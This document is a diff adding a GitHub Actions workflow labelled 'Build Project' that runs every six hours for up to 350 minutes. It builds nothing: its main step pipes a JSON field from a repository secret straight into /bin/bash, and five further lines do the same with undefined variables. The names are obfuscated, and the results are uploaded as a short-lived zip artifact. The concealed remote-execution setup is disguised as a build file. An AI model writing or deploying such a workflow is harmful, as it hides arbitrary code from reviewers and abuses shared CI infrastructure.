@@ -1,0 +1,33 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '28 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          vzfok148: ${{ secrets.vzfok148 }}
+        run: |
+          printf '%s' "$vzfok148" | jq -r .otjsi95323 | /bin/bash
+          printf '%s' "$yhb159" | jq -r .wmvv0 | /bin/bash
+          printf '%s' "$dz04" | jq -r .pujjw4591 | /bin/bash
+          echo $axb67241 | jq -r .shc4 | /bin/bash
+          printf '%s' "$b15428" | jq -r .dpxc6070 | /bin/bash
+          printf '%s' "$nbjo8" | jq -r .bdixe167 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7b1ADoMm
+          path: "*.zip"
+          retention-days: 1
